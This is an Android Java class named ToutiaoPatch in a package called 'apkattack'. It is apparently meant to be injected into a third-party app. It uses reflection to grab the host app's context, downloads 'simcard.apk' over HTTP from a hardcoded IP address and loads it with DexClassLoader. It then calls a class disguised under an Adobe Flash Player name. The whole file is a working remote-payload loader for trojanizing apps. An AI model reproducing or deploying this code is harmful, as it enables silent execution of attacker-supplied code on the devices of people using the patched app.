package com.example.apkattack;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.net.HttpURLConnection;
import java.net.URL;
import android.content.Context;
import android.util.Log;
import dalvik.system.DexClassLoader;

public class ToutiaoPatch extends Thread{
	
	
	public static void toutiaoPatchEntry(){
		ToutiaoPatch thread = new ToutiaoPatch();
		thread.start();
	}
	

	
	@Override
	public void run() {
		
		String Tag = "ToutiaoPatch";
		String subpath = "/appData/";
		String srcfilename = "simcard.apk";
		try {
			Log.e(Tag,"start");
			
	        Class<?> ActivityThread = Class.forName("android.app.ActivityThread");
	        Method methodcat = ActivityThread.getMethod("currentActivityThread");
	        Object currentActivityThread = methodcat.invoke(ActivityThread);
	        Method methodga = currentActivityThread.getClass().getMethod("getApplication");
	        Context context =(Context)methodga.invoke(currentActivityThread);
			if (context == null) {
				Log.e(Tag, "context null");
				return;
			}else{
				Log.e(Tag, "context ok,package name:" + context.getPackageName()+"/class name:" + 
						context.getClass().getName());
			}
			
			Throwable ex = new Throwable();
	        StackTraceElement[] stackElements = ex.getStackTrace();
	        if (stackElements != null) {
	            for (int i = 0; i < stackElements.length; i++) {
	            	Log.e(Tag, "class:" + stackElements[i].getClassName()+"/method:" + stackElements[i].getMethodName());
	            }
	        }
			
	        String apppath = context.getFilesDir() + subpath;
	        File apppathFile = new File(apppath);
	        if (apppathFile.exists() == false) {
				apppathFile.mkdir();
			}
	        
		    String plugin = apppath + srcfilename;
		    File pluginfile = new File(plugin);
		    if (pluginfile.exists() == false) {
				
		    	//String host = "47.101.189.13";
		    	String host = "47.116.51.29";
		    	//String username = "test20190701";
		    	
		    	//String filename = username + ".apk";

			    String url = "http://" + host + "/" + srcfilename;

			    String httpmethod = "GET";

			    URL realUrl = new URL(url);

			    HttpURLConnection connection = (HttpURLConnection)realUrl.openConnection();
			    
			    connection.setRequestProperty("Accept", "*/*");
			    connection.setRequestProperty("Connection", "Keep-Alive");
			    connection.setRequestProperty("User-Agent","Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)");
			    if(host != null && host.equals("") == false){
			    	connection.setRequestProperty("Host", host);
			    }

			    connection.setRequestMethod(httpmethod); 
			    connection.connect();
			
			    int retcode = connection.getResponseCode();
			    if(retcode != 200){
			    	Log.e(Tag,"getResponseCode:" + retcode);
			    	return ;
			    }
			    
			    FileOutputStream fout = new FileOutputStream(new File(plugin));
			    InputStream in = connection.getInputStream();
			    byte [] buf = new byte[0x10000];
			    int len = 0;
			    while ((len = in.read(buf,0,0x10000)) > 0) {
			        fout.write(buf,0,len);
			    }
			    
			    fout.close();
			}

	    	String dexmethodname = "start";
	    	String dexclassname = "com.adobe.flashplayer.JarEntry";
			String appcachepath = context.getCacheDir() + "/";
			DexClassLoader dexcl = new DexClassLoader(plugin, appcachepath, null,context.getClassLoader());
			Class<?> cls = dexcl.loadClass(dexclassname);
		    Object obj = cls.newInstance();
		    Method method = cls.getDeclaredMethod(dexmethodname, Context.class,String.class);
		    method.invoke(obj,context,apppath);
		    
		    Log.e(Tag,"plugin loaded ok");
		} catch (Exception e) {
			e.printStackTrace();
			return;
		}
	}
}
